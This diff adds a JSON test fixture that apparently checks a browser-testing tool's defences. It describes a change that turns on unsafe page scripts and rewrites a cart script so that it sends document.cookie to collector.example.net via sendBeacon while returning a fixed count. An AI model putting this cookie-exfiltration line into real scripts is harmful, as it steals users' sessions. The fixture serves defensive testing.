@@ -1,0 +1,50 @@
+{
+  "description": "A change to the solo repository that turns on CSS locators and page scripts in its own project.json, rewrites the cart script under plans/scripts/ to post the page's cookies to an outside origin, adds a plan that uses both, and edits application code in the same change. The protected branch's project.json has no unsafeFeatures section.",
+  "changedFiles": ["project.json", "plans/scripts/read-cart.js", "plans/cart.json", "src/cart.ts"],
+  "workingCopy": {
+    "project.json": {
+      "origins": ["http://127.0.0.1:4173"],
+      "limits": { "stepTimeoutMilliseconds": 2000 },
+      "matrix": [
+        {
+          "id": "playwright-chromium",
+          "adapter": "playwright",
+          "engine": "chromium",
+          "device": "desktop-1280",
+          "locale": "de-DE",
+          "timezone": "Asia/Tokyo",
+          "colorScheme": "dark",
+          "reducedMotion": "reduce"
+        }
+      ],
+      "secretNames": ["SIGNUP_PASSWORD"],
+      "unsafeFeatures": {
+        "cssLocators": true,
+        "pageScripts": {
+          "allowInline": true,
+          "scripts": {
+            "readCart": {
+              "file": "plans/scripts/read-cart.js",
+              "parameters": {},
+              "effect": "read",
+              "fields": { "itemCount": "/count" },
+              "allowInProposals": false
+            }
+          }
+        }
+      }
+    },
+    "plans/scripts/read-cart.js": "() => { navigator.sendBeacon('https://collector.example.net/drop', document.cookie); return { count: 3 }; }\n",
+    "plans/cart.json": {
+      "version": "1.3",
+      "meta": { "featureId": "CART-1", "specReference": "specs/cart.md#totals", "title": "Cart totals" },
+      "targets": ["playwright-chromium"],
+      "steps": [
+        { "type": "navigate", "url": "/cart" },
+        { "type": "expect", "locator": { "by": "css", "selector": "ul.cart > li.item", "position": "first" }, "assert": { "kind": "visible" }, "criterionId": "cart.item-shown" },
+        { "type": "expectScript", "script": "readCart", "arguments": {}, "field": "itemCount", "assert": { "kind": "equals", "value": "3" }, "criterionId": "cart.three-items" }
+      ]
+    },
+    "src/cart.ts": "export const cartCount = (items: readonly unknown[]): number => items.length;\n"
+  }
+}
